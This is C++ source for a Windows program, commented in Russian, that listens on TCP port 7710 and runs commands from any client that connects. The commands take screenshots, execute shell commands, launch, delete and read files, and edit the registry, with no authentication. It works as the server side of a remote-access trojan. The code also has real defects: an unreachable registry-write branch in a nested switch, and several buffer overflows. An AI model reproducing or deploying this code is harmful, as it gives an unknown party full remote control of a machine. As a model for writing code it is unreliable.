#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <string>
#include <cstdio>
#include <fstream>
#include "Header.h"
#include "Registry.h"
#pragma comment (lib,"Ws2_32.lib")

using namespace std;

DWORD WINAPI recvthread(LPVOID param)
{
	char buf2[1024];
	HKEY hKey = NULL;
	funtoins func;
	regedit reg(hKey);
	LONG lRet = 0;
	char inbuf[1024];
	SOCKET sock = *(SOCKET*)param;
	while (1)
	{
		int recvres = recv(sock, inbuf, 1023, 0);
		if (recvres == SOCKET_ERROR)break; //что-то пошло не по плану
		inbuf[recvres] = 0;
		//=====
		string mod_s(inbuf);
		int pos = mod_s.find(":");
		if (pos != string::npos)
		{
			char comand[100];
			char mod_s2[1024];
			strncpy(comand, inbuf, pos);
			comand[pos] = '\0';
			int comandi = atoi(comand);
			switch(comandi)
			{
                case 1:
					buf2[0] = 0;
					strcat(buf2, "Скриншот создан");
					strcat(buf2, "\n");
					func.screen_v();
					if (SOCKET_ERROR == send(sock, buf2, strlen(buf2) + 1, 0))
						break;
					cout << "Скриншот создан" << endl;
					break;
				case 2:
					func.openCDROM();
					buf2[0] = 0;
					strcat(buf2, "CD-ROM Открыт");
					strcat(buf2, "\n");
					if (SOCKET_ERROR == send(sock, buf2, strlen(buf2) + 1, 0))
						break;
						cout << "CD-ROM Открыт" << endl;
					break;
				case 3:
					func.closedCDROM();
					buf2[0] = 0;
					strcat(buf2, "CD-ROM закрыт");
					strcat(buf2, "\n");
					if (SOCKET_ERROR == send(sock, buf2, strlen(buf2) + 1, 0))
						break;
						cout << "CD-ROM закрыт" << endl;
					break;
				case 4:
					 mod_s = mod_s.substr(pos + 1);
					 mod_s2[0]=0;
					 strcpy(mod_s2, mod_s.c_str());
					func.CMDcom(mod_s2);
					buf2[0] = 0;
					strcat(buf2, "Команда выполнена");
					strcat(buf2, "\n");
					if (SOCKET_ERROR == send(sock, buf2, strlen(buf2) + 1, 0))
						break;
					break;
				case 5:
					mod_s = mod_s.substr(pos + 1);
					mod_s2[0] = 0;
					strcpy(mod_s2, mod_s.c_str());
					func.runfile(mod_s2);
					buf2[0] = 0;
					strcat(buf2, "Файл запущен");
					strcat(buf2, "\n");
					if (SOCKET_ERROR == send(sock, buf2, strlen(buf2) + 1, 0))
						break;
					cout << "Файл запущен: " << mod_s2;
					break;
				case 6:
					mod_s = mod_s.substr(pos + 1);
					mod_s2[0] = 0;
					strcpy(mod_s2, mod_s.c_str());
					buf2[0] = 0; 
					strcat(buf2, func.deletefile(mod_s2));
					strcat(buf2, "\n");
					if (SOCKET_ERROR == send(sock, buf2, strlen(buf2) + 1, 0))
						break;
					break;
				case 7:
					mod_s = mod_s.substr(pos + 1);
					mod_s2[0] = 0;
					strcpy(mod_s2, mod_s.c_str());
					func.readfile(mod_s2, param);
					buf2[0] = 0;
					strcat(buf2, "Файл прочитан");
					strcat(buf2, "\n");
					if (SOCKET_ERROR == send(sock, buf2, strlen(buf2) + 1, 0))
						break;
					cout << "Файл рпочитан: " << mod_s2;
					break;
				case 8:
					mod_s = mod_s.substr(pos + 1);
					mod_s2[0] = 0;
					strcpy(mod_s2, mod_s.c_str());
					pos = mod_s.find(":");
					if (pos != string::npos)
					{
						strncpy(comand, mod_s2, pos);
						comandi = atoi(comand);
						switch (comandi)
						{
							mod_s = mod_s.substr(pos + 1);
							mod_s2[0] = 0;
							strcpy(mod_s2, mod_s.c_str());
							reg.WriteKey(hKey, lRet, mod_s2, param);
							break;
						case 2:
							reg.QueryKey(hKey, param);
						default:
							break;
						}
					}
					break;
				default:
					break;
			}
		}
		else
		{
			cout << "Client: ";
			cout << inbuf;
		}

	};
	return(-1);
};

int main()
{
	setlocale(LC_ALL, "Rus");
	WSADATA WsaData;
	int error = WSAStartup(0x0202, &WsaData);

	if (error == SOCKET_ERROR)
	{
		cout << "WsaData_ERROR";
		WSACleanup();
		return 0;
	}

	SOCKET mysocket;
	mysocket = socket(AF_INET, SOCK_STREAM, 0);

	if (mysocket == -1)
	{
		cout << "SocketError";
		WSACleanup();
		return 0;
	}

	sockaddr_in my_addr;
	my_addr.sin_family = AF_INET;
	my_addr.sin_port = htons(7710);
	my_addr.sin_addr.s_addr = 0;

	error = bind(mysocket, (sockaddr*)&my_addr, sizeof(my_addr));

	if (error == -1)
	{
		cout << "bind_ERROR";
		WSACleanup();
		return 0;
	}

	listen(mysocket, 0x2);
	SOCKET client_socket;

	sockaddr_in addr_klient;
	int number_k = 0;
	int size_k = sizeof(addr_klient);

	cout << "listening..."<< endl;

	client_socket = accept(mysocket, (sockaddr*)&addr_klient, &size_k);
	closesocket(mysocket);
	if (client_socket<0)
	{
		cout << "accept_EROR";
		WSACleanup();
		return 0;
	}

	//отправка и прием 
	char buffer[1024];
	char chName[] = "Server: ";

	CreateThread(0, 0, recvthread, (LPVOID)&client_socket, 0, 0);//создаем собственно поток кторый слушает чо прийдет

	cout << "connect" << endl;
	while (1)//а этот цикл в основном потоке отправляет в сеть то что мы напичатали
	{
		/////////////////////////////////////////
		cin>>buffer ;//нужна альтернатива//да и за границы массива можно выйти
							 /////////////////////////////////////////
		strcat(buffer, "\n");


		if (SOCKET_ERROR == send(client_socket, buffer, strlen(buffer) + 1/*null-terminated string посылаем же*/, 0))
			break;
	}

	WSACleanup();//второй поток закрывать не нужно, так как после WSACleanup recv вернет SOCKET_ERROR и поток автоматом закроется
	return -1;
}